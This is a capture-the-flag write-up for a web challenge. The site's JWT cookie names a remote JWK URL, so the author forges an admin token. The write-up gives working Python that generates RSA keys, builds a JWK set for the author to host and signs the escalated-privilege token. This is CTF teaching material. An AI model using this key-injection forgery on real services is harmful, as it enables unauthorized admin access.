## 🎹 Challenge Name: Joy Otter Tiger
**Category**: Web  


### Investigation:
I first of all created a random account and logged in. The cookie was a jwt token, but seemed unsually large for HS256. So I threw it to jwt.io and saw its RS256 and jwk url was defined in the cookie. 

### Thoughts:
At this point, I was 90% sure about how to solve the challenge. Its a very common vulnerability to not check for malicious 3rd party jwk hosting endpoint. So I planned to create my own RSA keys, create a jwk json file and host it on webhook.site, then use the keys to create a admin jwt token signed with my own keys and pointing to my own jwk keys.

### Creating RSA pairs
```python
from jwcrypto import jwk
key = jwk.JWK.generate(kty='RSA', size=2048)
public_jwk = key.export_public(as_dict=True)
private_key_pem = key.export_to_pem(private_key=True, password=None)
public_key_pem = key.export_to_pem()

```

### Creating jwk.json
```python
kid = str(uuid.uuid4())
public_jwk['kid'] = kid
print('{\n  "keys": [')
print("    " + str(public_jwk).replace("'", '"'))
print("  ]\n}")
```

### Creating self signed jwt token 
```python
jwks_uri = "http://your_hosting.com/jwks.json"
payload = {
    "username": "a",
    "role": "admin",  # privilege escalation
    "iat": int(time.time())
}

# JWT header
headers = {
    "alg": "RS256",
    "typ": "JWT",
    "kid": kid,
    "uri": jwks_uri
}

# Sign JWT using private key
token = jwt.encode(payload, private_key_pem, algorithm="RS256", headers=headers)
print(token)
```

### Flag

Now if we use this jwt token as auth cookie, server will use our own jwk keys to test it, and it will be accepted, and we will get the flag.
